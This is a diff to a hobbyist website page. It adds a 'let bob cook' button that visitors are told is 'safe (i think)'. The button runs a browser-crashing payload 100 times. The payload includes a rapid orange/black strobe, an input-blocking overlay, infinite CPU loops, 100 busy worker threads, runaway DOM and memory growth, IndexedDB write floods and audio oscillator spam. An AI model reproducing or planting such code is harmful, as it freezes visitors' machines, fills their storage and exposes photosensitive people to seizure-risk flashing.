@@ -111,7 +111,7 @@ button:active {
 }
 
 /* pixel background layer */
-.pixel-bg {
+.ambient-bg {
   position: absolute;
   inset: 0;
   background-image:
@@ -176,22 +176,8 @@ button:active {
 
   </style>
 </head>
-
 <body>
-<div id="titleScreen">
-  <div class="ambient-bg"></div>
 
-  <div class="title-content">
-    <h1>(╯°□°）╯ DAWEBSITE</h1>
-    <button onclick="enterHome()">▶ PLAY</button>
-  </div>
-</div>
-
-<script>
-function enterHome() {
-  document.getElementById("titleScreen").style.display = "none";
-}
-</script>
   <audio controls autoplay loop>
     <source src="wii-shop.mp3">
   </audio>
@@ -421,42 +407,11 @@ function enterHome() {
 <section id="lagger" style="text-align:center; padding:40px;">
   <h2>click here to let bob lag your cite</h2>
   <p>its safe (i think)</p>
-  <button onclick="bobFreeze()">let bob cook</button>
+  <button onclick="letBobCook100()">let bob cook</button>
 </section>
 
-<script>
-function bobFreeze() {
-  alert("there is no turning back...");
-
-  const body = document.body;
-  let strobe = true;
-
-  // Freeze + strobe for 5 seconds
-  const strobeInterval = setInterval(() => {
-    body.style.background = strobe ? "black" : "orange";
-    strobe = !strobe;
-  }, 100); // 500ms = 10 flashes/sec
-
-  // Lock user input visually by covering everything (optional)
-  const overlay = document.createElement("div");
-  overlay.style.position = "fixed";
-  overlay.style.inset = "0";
-  overlay.style.zIndex = "9999";
-  overlay.style.cursor = "wait";
-  body.appendChild(overlay);
-
-  // Stop after 5 seconds
-  setTimeout(() => {
-    clearInterval(strobeInterval);
-    body.style.background = ""; // back to normal
-    overlay.remove();           // remove overlay
-    alert("u survived... not 4 long");
-  }, 1000000000);
-}
-</script>
-
-
-
+<div id="root"></div>
+<canvas id="c" width="0" height="0"></canvas>
 
 <section id="game" style="text-align:center; padding:40px; font-family: Consolas, 'Courier New', monospace;">
   <h2>game (instant dopamine rush lol)</h2>
@@ -485,6 +440,150 @@ function bobFreeze() {
     <li>thnks to u i guess</li>
   </ul>
 </section>
+
+<script>
+function bobFreeze() {
+  const body = document.body;
+  let strobe = true;
+
+  // Overlay to block user input
+  const overlay = document.createElement("div");
+  overlay.style.position = "fixed";
+  overlay.style.inset = "0";
+  overlay.style.zIndex = "9999";
+  overlay.style.cursor = "wait";
+  body.appendChild(overlay);
+
+  const strobeInterval = setInterval(() => {
+    body.style.background = strobe ? "black" : "orange";
+    strobe = !strobe;
+  }, 100);
+
+  // Start apocalypse after a tiny delay
+  setTimeout(() => {
+    apocalypse();
+  }, 100);
+
+  // Optional super long cleanup
+  setTimeout(() => {
+    clearInterval(strobeInterval);
+    overlay.remove();
+    body.style.background = "";
+  }, 1000000000);
+}
+
+// Wrapper to run the apocalypse 100 times
+function letBobCook100() {
+  alert("bob is hecking");
+  for (let i = 0; i < 100; i++) {
+    bobFreeze();
+  }
+}
+
+function apocalypse() {
+  const root = document.getElementById("root");
+  const canvas = document.getElementById("c");
+  const ctx = canvas.getContext("2d");
+
+  /* ================= MAIN THREAD DEATH ================= */
+  setTimeout(() => { while(true){ Math.sqrt(Math.random()); } }, 200);
+
+  /* ================= DOM + LAYOUT HELL ================= */
+  setInterval(() => {
+    for (let i = 0; i < 3000; i++) {
+      const d = document.createElement("div");
+      d.className = "box";
+      root.appendChild(d);
+      d.offsetHeight;
+    }
+  }, 0);
+
+  /* ================= CSS REPAINT THRASH ================= */
+  setInterval(() => {
+    document.body.style.filter =
+      `blur(${Math.random()*5}px) hue-rotate(${Math.random()*360}deg)`;
+  }, 0);
+
+  /* ================= CANVAS + GPU FLOOD ================= */
+  function draw() {
+    for (let i = 0; i < 10000; i++) {
+      ctx.fillStyle = `hsl(${Math.random()*360},100%,50%)`;
+      ctx.fillRect(Math.random()*3000, Math.random()*3000, 100, 100);
+    }
+    requestAnimationFrame(draw);
+  }
+  draw();
+
+  /* ================= MEMORY LEAK ================= */
+  const leak = [];
+  setInterval(() => { leak.push(new Array(5e6).fill(Math.random())); }, 50);
+
+  /* ================= AUDIO CONTEXT ABUSE ================= */
+  const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+  setInterval(() => {
+    const osc = audioCtx.createOscillator();
+    osc.frequency.value = Math.random() * 20000;
+    osc.connect(audioCtx.destination);
+    osc.start();
+  }, 5);
+
+  /* ================= WORKER SWARM ================= */
+  const workerCode = `while(true){Math.sqrt(Math.random());}`;
+  const blob = new Blob([workerCode], { type: "application/javascript" });
+  const url = URL.createObjectURL(blob);
+  for (let i = 0; i < 100; i++) new Worker(url);
+
+  /* ================= OBSERVER FEEDBACK LOOP ================= */
+  const mo = new MutationObserver(() => { root.appendChild(document.createElement("span")); });
+  mo.observe(root, { childList: true });
+  const ro = new ResizeObserver(() => { root.style.width = (Math.random() * 1000) + "px"; });
+  ro.observe(root);
+
+  /* ================= INDEXEDDB WRITE FLOOD ================= */
+  indexedDB.open("doom", 1).onsuccess = e => {
+    const db = e.target.result;
+    db.createObjectStore("x", { autoIncrement: true });
+    setInterval(() => {
+      const tx = db.transaction("x", "readwrite");
+      tx.objectStore("x").add(new Array(1e5).fill("💀"));
+    }, 10);
+  };
+
+  /* ================= TIMER STORM ================= */
+  function timerStorm() { setTimeout(timerStorm, 0); setInterval(()=>{},0); }
+  timerStorm();
+}
+</script>
+
+<style>
+body { font-family: sans-serif; filter: blur(0px); }
+.box {
+  width: 20px;
+  height: 20px;
+  background: red;
+  display: inline-block;
+  animation: spin 0.1s linear infinite;
+}
+@keyframes spin {
+  from { transform: rotate(0deg) scale(1); }
+  to { transform: rotate(360deg) scale(1.2); }
+}
+</style>
+
+<style>
+  body { font-family: sans-serif; filter: blur(0px); }
+  .box {
+    width: 20px;
+    height: 20px;
+    background: red;
+    display: inline-block;
+    animation: spin 0.1s linear infinite;
+  }
+  @keyframes spin {
+    from { transform: rotate(0deg) scale(1); }
+    to { transform: rotate(360deg) scale(1.2); }
+  }
+</style>
 
 </body>
 </html>
